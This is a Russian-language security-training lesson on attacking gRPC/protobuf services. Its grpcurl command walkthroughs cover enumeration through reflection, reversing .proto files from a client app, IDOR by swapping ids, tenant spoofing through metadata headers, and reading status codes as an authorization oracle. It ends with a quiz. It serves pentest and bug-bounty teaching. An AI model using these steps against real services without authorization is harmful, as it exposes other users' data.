---
id: web-grpc
title: "gRPC и protobuf: реверс и атаки"
category: web
parent: web-api-rest-graphql-soap
difficulty: hard
order: 3
tags: [grpc, protobuf, http2, reflection, reverse]
prerequisites: [web-api-rest-graphql-soap, web-http2-attacks]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
  - "Пентест веб-приложений"
estimated_minutes: 40
summary: "gRPC/protobuf: реверс .proto, gRPC reflection, вызов методов без схемы, grpc-web, атаки на HTTP/2-транспорт."
---

## Вопрос, с которого всё начинается

Ты нашёл порт `50051` — на нём крутится сервис, который общается не JSON-ом, а каким-то бинарным форматом. Открываешь в браузере — пусто. Это gRPC: современный RPC-фреймворк поверх HTTP/2, где тело запроса — не читаемый JSON, а **protobuf** (двоичный формат).

Вопрос: как вообще атаковать то, что нельзя прочитать глазами? Ответ — восстановить схему. И тут есть хорошая новость: у gRPC часто включён механизм, который отдаёт схему сам. Сегодня пройдём от опознания gRPC до IDOR на его методе.

## Наш пример: gRPC-эндпоинт

Наш сервис — `app.example:50051`. Первым делом убедимся, что это gRPC. Обычный HTTP-запрос покажет заголовки, а `grpcurl` — список сервисов:

```bash
$ curl -s -I https://app.example:50051/ | grep -i 'content-type'
content-type: application/grpc
$ grpcurl -plaintext app.example:50051 list
myapp.UserService
myapp.AdminService
```

`Content-Type: application/grpc` подтверждает: это gRPC. А команда `grpcurl ... list` вернула **имена сервисов** — значит, на сервере включён **server reflection** (сервис сам отдаёт свои `.proto`-дескрипторы). Это как интроспекция в GraphQL: разведка становится делом пяти секунд.

## Шаг 1: reflection — получаем схему

Смотрим, какие методы есть у сервисов:

```bash
$ grpcurl -plaintext app.example:50051 list myapp.AdminService
myapp.AdminService.DeleteUser
myapp.AdminService.Impersonate
$ grpcurl -plaintext app.example:50051 describe myapp.UserService.GetUser
myapp.UserService.GetUser is a method:
rpc GetUser ( .myapp.GetUserRequest ) returns ( .myapp.User );
```

`describe` показал контракт: метод `GetUser` принимает `GetUserRequest` и возвращает `User`. Обрати внимание на `AdminService` с методами `DeleteUser` и `Impersonate` — админские сервисы часто защищены слабее пользовательских.

## Шаг 2: вызываем метод и ищем IDOR

Теперь зовём метод напрямую. Сначала со своим токеном, потом с чужим ID:

```bash
$ grpcurl -plaintext -rpc-header 'authorization: Bearer '$TOKEN \
>   -d '{"id":"1001"}' app.example:50051 myapp.UserService/GetUser
{
  "id": "1001",
  "email": "me@x.com"
}
```

Меняем `id` на соседний:

```bash
$ grpcurl -plaintext -rpc-header 'authorization: Bearer '$TOKEN \
>   -d '{"id":"1002"}' app.example:50051 myapp.UserService/GetUser
{
  "id": "1002",
  "email": "victim@corp.com"
}
```

Вернулся чужой пользователь — **IDOR/BOLA**. gRPC часто не проверяет владельца объекта на уровне метода, потому что «клиент и так свой». Артефакт — чужие данные в ответе.

## Шаг 3: если reflection выключен — реверс `.proto`

Бывает, что `list` возвращает ошибку `Unimplemented` — reflection закрыт. Тогда схему достают из клиента: `.proto`-файлы или имена методов часто зашиты в приложение:

```bash
$ unzip -o app.apk -d app && grep -rl "\.proto" app | head
app/assets/user.proto
$ strings libapp.so | grep -iE 'Service|/Method'
myapp.UserService/GetUser
```

Нашли `user.proto` — теперь можно вызывать методы, указав схему вручную:

```bash
$ grpcurl -plaintext -import-path app/assets -proto user.proto \
>   -d '{"id":"1001"}' app.example:50051 myapp.UserService/GetUser
```

Если схемы нет вовсе, помогает `protoc --decode_raw` или `blackboxprotobuf`: protobuf-поля пронумерованы, и по форме сообщения схему восстанавливают частично.

## Шаг 4: metadata и авторизация

gRPC передаёт данные аутентификации и тенанта в **metadata** — это аналог HTTP-заголовков. Часто сервер доверяет полю вроде `x-tenant` или `x-user-id` без проверки:

```bash
$ grpcurl -plaintext -rpc-header 'x-tenant: 2' \
>   -d '{"id":"1"}' app.example:50051 myapp.UserService/GetUser
{
  "id": "1",
  "email": "other-tenant@corp.com"
}
```

Подменили `x-tenant` — получили данные другого тенанта. Проверяй все metadata-поля: отсутствие токена, чужой токен, подмену идентификатора.

## Шаг 5: статус-коды как оракул

gRPC использует свои коды, и они прямо подсказывают состояние проверки прав. Ключевое сравнение:

| Код | Число | Значение для теста |
|-----|-------|--------------------|
| `OK` | 0 | запрос прошёл |
| `PERMISSION_DENIED` | 7 | права проверены |
| `UNAUTHENTICATED` | 16 | нужен токен |
| `NOT_FOUND` | 5 | объект не найден (часто IDOR!) |
| `RESOURCE_EXHAUSTED` | 8 | rate-limit / DoS-точка |

Если при подмене `id` возвращается `NOT_FOUND`, а не `PERMISSION_DENIED`, — авторизация, скорее всего, не проверяется: сервер просто ищет объект и не находит. Это сигнал копать глубже.

## Если не сработало

- `list` возвращает `Unimplemented` — reflection закрыт; реверсь `.proto` из клиента или используй `protoc --decode_raw`.
- Метод защищён, но вернул `PERMISSION_DENIED` — ищи `AdminService`/`Debug`/`Internal` сервисы: они часто защищены слабее.
- Тело непонятно — перехвати легитимный трафик в Burp (с gRPC-расширением) и повтори запрос, меняя поля.
- Браузерный клиент использует **gRPC-web** (`Content-Type: application/grpc-web+proto`) — там другой формат, но те же атаки; проверяй CORS и доступность нативных методов через прокси.

## Чем gRPC отличается от REST

Полезно держать разницу в голове, чтобы не искать привычные артефакты:

| Аспект | REST | gRPC |
|--------|------|------|
| Транспорт | HTTP/1.1 | HTTP/2 (h2c/h2) |
| Формат тела | JSON | protobuf (binary) |
| Схема | OpenAPI (часто) | `.proto` (не всегда доступна) |
| Reflection | нет | есть, если включён |
| Ошибки | HTTP-коды | status-коды gRPC |
| Метаданные | заголовки | metadata |
| Стриминг | SSE/WS | встроенный |

Практический вывод: Burp в стандартной настройке «не видит» бинарный protobuf — нужны gRPC-расширения или `grpcurl`, а авторизацию проверяют в metadata, а не в заголовках.

## Потоковые вызовы

У gRPC четыре режима: unary, server-streaming, client-streaming и bidirectional. Потоки часто лишены тех же проверок, что и обычные вызовы:

```bash
$ grpcurl -plaintext -d '{}' app.example:50051 myapp.Feed/Subscribe
```

Server-streaming отдаёт всё, что сервер решит прислать; типичный баг — подписка на чужой топик. Client-streaming может принять бесконечный поток и упасть по памяти. Проверяй каждый поток на авторизацию и лимиты (`RESOURCE_EXHAUSTED` не должен наступать слишком поздно).

## Что мы теперь знаем

- gRPC — RPC поверх HTTP/2, тело — бинарный protobuf, метод в пути `/package.Service/Method`.
- **Reflection** отдаёт схему сервисов; без неё схему реверсят из клиента.
- `grpcurl` позволяет перечислить сервисы, описать метод и вызвать его.
- Авторизацию проверяют в **metadata** (`authorization`, `x-tenant`), а не в привычных заголовках.
- IDOR/BOLA живут и здесь: подмена `id` возвращает чужой объект.
- Статус-коды gRPC (`NOT_FOUND` vs `PERMISSION_DENIED`) — оракул на наличие проверки прав.

## На что смотреть дальше

- Не считай gRPC «закрытым» — это HTTP/2, всё тестируемо.
- Не жди JSON: для тела нужен десериализатор или `grpcurl`.
- Всегда проверь reflection — часто он включён и отдаёт всю схему.
- Не забудь про gRPC-web: в браузере другой `Content-Type` и другой прокси.
- Осторожно с нагрузочными тестами (`ghz`) — DoS на прод только с разрешения.

## Квиз

Проверь себя.

```quiz
- question: "Как выглядит путь gRPC-метода?"
  options:
    - "/api/v1/users"
    - "/package.Service/Method"
    - "/graphql"
    - "/rest"
  answer: 1
  explanation: "Полное имя сервиса и метода."
- question: "Какой инструмент вызывает gRPC-методы из CLI?"
  options:
    - "curl"
    - "grpcurl"
    - "nmap"
    - "ffuf"
  answer: 1
  explanation: "grpcurl поддерживает reflection и вызовы методов."
- question: "Что даёт gRPC reflection?"
  options:
    - "Пароли"
    - "Схему сервисов и методов"
    - "TLS-ключ"
    - "Логи сервера"
  answer: 1
  explanation: "Сервер отдаёт .proto-дескрипторы."
- question: "Как декодировать protobuf без схемы?"
  options:
    - "base64"
    - "protoc --decode_raw"
    - "openssl"
    - "jq"
  answer: 1
  explanation: "Показывает поля и значения по номерам."
- question: "Какая топ-угроза в gRPC-методах?"
  options:
    - "XSS"
    - "BOLA/IDOR — доступ к чужим объектам по id"
    - "CSRF"
    - "Clickjacking"
  answer: 1
  explanation: "Как и в REST API — нет проверки владельца."
```

## Куда дальше

В следующем уроке мы посмотрим на **WebSocket** (`web-websocket`) — ещё один протокол реального времени, где после рукопожатия приложение само отвечает за авторизацию, и где живут cross-site hijacking и IDOR в сообщениях. А пока главное запомни: бинарный формат — не защита; восстанови схему, и gRPC станет таким же тестируемым, как REST.

## Где пригодится

- **CTF (Web):** задачи на gRPC и реверс `.proto`.
- **Bug bounty:** внутренние gRPC-API, IDOR.
- **Пентест:** реверс и аудит RPC-сервисов.
- **Работа (AppSec):** отключение reflection в проде, авторизация на методах, mTLS.
